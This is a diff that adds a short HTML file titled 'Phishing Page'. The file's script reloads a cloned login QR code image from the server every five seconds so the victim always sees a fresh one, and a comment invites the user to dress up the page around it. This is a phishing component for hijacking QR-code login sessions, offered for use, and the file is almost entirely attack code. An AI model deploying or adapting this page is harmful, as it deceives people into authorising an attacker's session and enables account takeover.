@@ -1,0 +1,19 @@
+<html>
+<title>Phishing Page</title>
+<head>
+</head>
+<body>
+<script>
+//Our timer to update the image tag with the leatest generated qr code image file (tmp.jpg)
+var myTimer;
+myTimer = window.setInterval(reloadD,5000);
+function reloadD(){
+d = new Date();
+//We added a date to grab the non-cached version of the qr code image file from server
+document.getElementById('qrcodew').src="tmp.jpg?h="+d.getTime();
+}
+</script>
+<!-- Add your prefered body here and adjust the size and position of the coloned qr code image tag -->
+<img id="qrcodew" alt="Scan me!" src="tmp.jpg" style="display: block;">
+</body>
+</html>
